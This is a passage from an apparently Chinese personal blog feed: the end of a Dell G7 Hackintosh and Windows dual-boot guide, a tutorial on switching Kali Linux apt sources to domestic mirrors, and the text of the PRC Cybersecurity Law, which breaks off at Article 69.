src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/LMib99-202003241450-cqTD21.png" alt="LMib99-202003241450-cqTD21"></p><p>安装完成，第一次引导启动也很慢（5-10分钟左右,Clover开启啰嗦模式则会在屏幕上输出一大堆日志信息）</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/O9yyTL-202003241511-z6tpdl.png" alt="O9yyTL-202003241511-z6tpdl"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/XiewPM-202003241512-eYOvpY.png" alt="XiewPM-202003241512-eYOvpY"></p><p>这里有个坑，就是千万不要联网，Apple ID在进入系统后在设置</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/UOfMmr-202003241512-fvb1oI.png" alt="UOfMmr-202003241512-fvb1oI"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/ZFvBQL-202003241512-x3eOPH.png" alt="ZFvBQL-202003241512-x3eOPH"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/AhfcNG-202003241513-tt1ApL.png" alt="AhfcNG-202003241513-tt1ApL"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/YTnI7C-202003241513-1wNrwK.png" alt="YTnI7C-202003241513-1wNrwK"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/XMK2Gd-202003241513-lbEqBu.png" alt="XMK2Gd-202003241513-lbEqBu"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/F4teWU-202003241513-4A5nww.png" alt="F4teWU-202003241513-4A5nww"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/K5IEug-202003241514-TsjqGb.png" alt="K5IEug-202003241514-TsjqGb"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/4Oolo7-202003241515-r5Z75m.png" alt="4Oolo7-202003241515-r5Z75m"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/kmVhbm-202003241516-387j52.png" alt="kmVhbm-202003241516-387j52"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/JYEeL4-202003241516-bVafmI.png" alt="JYEeL4-202003241516-bVafmI"></p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/UTVpPn-202003241516-G1wK9e.png" alt="UTVpPn-202003241516-G1wK9e"></p><p>至此，戴尔G7 macOS就已经完全安装好了，自己玩吧。</p><h2 id="设置硬盘引导">设置硬盘引导</h2><ol><li>打开Mac上的终端</li><li>输入 <code>diskutil list</code> 出现类似的页面</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/01/V5M9FX-202003241704-5CUoUo.png" alt="V5M9FX-202003241704-5CUoUo"></p><p>挂载EFI分区 <code>sudo diskutil mount disk0s1</code></p><ol><li><strong>注意磁盘编号与自己实际的磁盘编号，不要照抄，要灵活变通</strong></li><li>打开这两个分区（在桌面上，桌面上没有的话，在访达里找），直接将USB的EFI分区下面的EFI目录直接复制到磁盘上的EFI分区里.</li></ol><h2 id="安装Win10">安装Win10</h2><ol><li>开机时按F12，选择U盘启动</li><li>然后按照正常的windows <a href="../install-win10/">安装流程（点我）</a>来，从<strong>系统安装</strong>开始看。</li><li>到第十五步的时候，选择安装位置之前，一定要选择第二个分区，因为之前用第一个分区装的Mac，选择第二个分区后要格式化，然后继续按教程安装</li></ol><h2 id="设置EFI引导">设置EFI引导</h2><p>进入PE后打开BOOTICE软件，选择物理磁盘，选择欲操作的目标磁盘，点击分区管理</p><p>弹出分区管理的窗口，点击分配盘符，为ESP分区分配一个盘符</p><p>点击确定</p><p>选择UEFI，点击修改启动序列，点击添加按钮，选择启动文件，在打开的窗口里选择ESP分区下的目录</p><p><code>\EFI\CLOVER\CLOVERX64.EFI</code>，菜单标题填写:CLOVER，调节该项到第一位</p><p>点击保存当前启动项设置</p><h2 id="完成安装">完成安装</h2><p>重新启动就能使用win和mac双系统啦~</p><h2 id="后记">后记</h2><p>装个Mac折腾了半天~这个镜像已经把各种补丁驱动已经装好了，直接用就行，无线网卡使用外接usb WiFi就行 当然，你可以把原来的网卡拆掉换成可以用黑苹果的网卡，看看自己的接口去某宝找1820A等无线网卡。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Hackintosh </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 黑果 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux 更换镜像源</title>
      <link href="/posts/35599f1b/"/>
      <url>/posts/35599f1b/</url>
      
        <content type="html"><![CDATA[<h2 id="编辑sources-list文件">编辑sources.list文件</h2><p>终端下管理员模式输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/02/image-20210213145325925.png" alt="image-20210213145325905"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#aliyun 阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># ustc 中科大</span></span><br><span class="line"><span class="comment"># deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="comment"># deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="comment"># deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span></span><br><span class="line"><span class="comment"># deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kali 官方源</span></span><br><span class="line"><span class="comment"># deb http://http.kali.org/kali kali-rolling main non-free contrib </span></span><br><span class="line"><span class="comment"># deb-src http://http.kali.org/kali kali-rolling main non-free contrib </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认的，可以注释掉不用管</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># deb cdrom:[Kali GNU/Linux 2020.2rc3 _Kali-last-snapshot_ - Official amd64 DVD Binary-1 with firmware 20200508-14:35]/ kali-rolling contrib main non-free</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#deb cdrom:[Kali GNU/Linux 2020.2rc3 _Kali-last-snapshot_ - Official amd64 DVD Binary-1 with firmware 20200508-14:35]/ kali-rolling contrib main non-free</span></span><br><span class="line"><span class="comment"># 注释掉</span></span><br><span class="line"><span class="comment"># deb http://http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="comment"># deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This system was installed using small removable media</span></span><br><span class="line"><span class="comment"># (e.g. netinst, live or single CD). The matching &quot;deb cdrom&quot;</span></span><br><span class="line"><span class="comment"># entries were disabled at the end of the installation process.</span></span><br><span class="line"><span class="comment"># For information about how to configure apt package sources,</span></span><br><span class="line"><span class="comment"># see the sources.list(5) manual.</span></span><br></pre></td></tr></table></figure><h2 id="清理安装包">清理安装包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get clean</span><br><span class="line">sudo  apt-get autoclean</span><br></pre></td></tr></table></figure><h2 id="更新">更新</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade &amp;&amp; sudo apt-get dist-upgrade</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中华人民共和国网络安全法</title>
      <link href="/posts/netlaw/"/>
      <url>/posts/netlaw/</url>
      
        <content type="html"><![CDATA[<p>《中华人民共和国网络安全法》是为保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展而制定的法律。</p><p>《中华人民共和国网络安全法》由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，自2017年6月1日起施行</p><p>中文名：中华人民共和国网络安全法</p><p>外文名：The Cybersecurity Law of the People’s Republic of China</p><p>通过会议：中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议</p><p>发布日期：2016年11月7日</p><p>实施日期：2017年6月1日</p><p>目　录</p><p>第一章　总　则</p><p>第二章　网络安全支持与促进</p><p>第三章　网络运行安全</p><p>第一节　一般规定</p><p>第二节　关键信息基础设施的运行安全</p><p>第四章　网络信息安全</p><p>第五章　监测预警与应急处置</p><p>第六章　法律责任</p><p>第七章　附　则</p><p><strong>第一章　总　则</strong></p><p>第一条　为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p><p>第二条　在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p><p>第三条　国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p><p>第四条　国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p><p>第五条　国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p><p>第六条　国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p><p>第七条　国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p><p>第八条　国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。</p><p>县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p><p>第九条　网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p><p>第十条　建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p>第十一条　网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p><p>第十二条　国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。</p><p>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p><p>第十三条　国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p><p>第十四条　任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。</p><p>有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p><p><strong>第二章　网络安全支持与促进</strong></p><p>第十五条　国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。</p><p>国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p><p>第十六条　国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p><p>第十七条　国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p><p>第十八条　国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。</p><p>国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p><p>第十九条　各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。</p><p>大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p><p>第二十条　国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p><p><strong>第三章　网络运行安全</strong></p><p>第一节　一般规定</p><p>第二十一条　国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</p><p>（四）采取数据分类、重要数据备份和加密等措施；</p><p>（五）法律、行政法规规定的其他义务。</p><p>第二十二条　网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。</p><p>网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p><p>第二十三条　网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p><p>第二十四条　网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。</p><p>国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p><p>第二十五条　网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p><p>第二十六条　开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p><p>第二十七条　任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p><p>第二十八条　网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。</p><p>第二十九条　国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。</p><p>有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p><p>第三十条　网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。</p><p>第二节　关键信息基础设施的运行安全</p><p>第三十一条　国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。</p><p>国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p><p>第三十二条　按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p><p>第三十三条　建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p><p>第三十四条　除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</p><p>（三）对重要系统和数据库进行容灾备份；</p><p>（四）制定网络安全事件应急预案，并定期进行演练；</p><p>（五）法律、行政法规规定的其他义务。</p><p>第三十五条　关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p><p>第三十六条　关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p><p>第三十七条　关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p><p>第三十八条　关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p><p>第三十九条　国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p><p>（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</p><p>（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</p><p>（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p><p><strong>第四章　网络信息安全</strong></p><p>第四十条　网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p><p>第四十一条　网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。</p><p>网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p><p>第四十二条　网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。</p><p>网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>第四十三条　个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。</p><p>第四十四条　任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p><p>第四十五条　依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p><p>第四十六条　任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p><p>第四十七条　网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p><p>第四十八条　任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。</p><p>电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p><p>第四十九条　网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。</p><p>网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p>第五十条　国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p><p><strong>第五章　监测预警与应急处置</strong></p><p>第五十一条　国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p><p>第五十二条　负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p><p>第五十三条　国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。</p><p>负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。</p><p>网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p><p>第五十四条　网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；</p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；</p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p><p>第五十五条　发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p><p>第五十六条　省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p><p>第五十七条　因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p><p>第五十八条　因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p><p><strong>第六章　法律责任</strong></p><p>第五十九条　网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p><p>关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p><p>第六十条　违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p><p>（一）设置恶意程序的；</p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；</p><p>（三）擅自终止为其产品、服务提供安全维护的。</p><p>第六十一条　网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十二条　违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p><p>第六十三条　违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。</p><p>单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p><p>第六十四条　网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。</p><p>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p><p>第六十五条　关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十六条　关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十七条　违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。</p><p>单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>第六十八条　网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p><p>第六十九条　